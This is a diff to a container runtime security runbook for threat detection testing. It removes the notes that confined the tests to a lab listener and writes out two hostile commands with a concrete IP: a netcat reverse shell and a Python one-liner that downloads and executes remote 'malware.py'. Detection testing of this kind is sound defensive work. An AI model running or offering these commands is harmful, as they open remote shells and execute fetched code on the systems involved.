@@ -1,6 +1,6 @@
 
 ================================================================================
-         CLOUD RUNTIME SECURITY — THREAT DETECTION TESTING RUNBOOK
+         CONTAINER RUNTIME SECURITY - THREAT DETECTION TESTING RUNBOOK
                      SecOps Testbed  |  v0.9.10 / v0.9.11
 ================================================================================
 
@@ -223,10 +223,8 @@
   attacker-controlled listener and spawning an interactive bash session over
   the network.
 
-  NOTE: Replace <ATTACKER_IP> and <PORT> with your controlled lab listener.
-
   Command:
-    nc -e /bin/bash <ATTACKER_IP> <PORT>
+    nc -e /bin/bash 10.113.107.226 4444
 
 
   TEST 14 — Fileless Remote Script Execution via Python urllib
@@ -238,10 +236,8 @@
   without writing to disk — a fileless execution technique used to evade
   file-based and signature-based detection.
 
-  NOTE: Replace <ATTACKER_IP> and <PORT> with your controlled lab server.
-
   Command:
-    python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://<ATTACKER_IP>:<PORT>/payload.py").read())'
+    python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://10.113.107.226:8000/malware.py").read())'
 
 
 ================================================================================
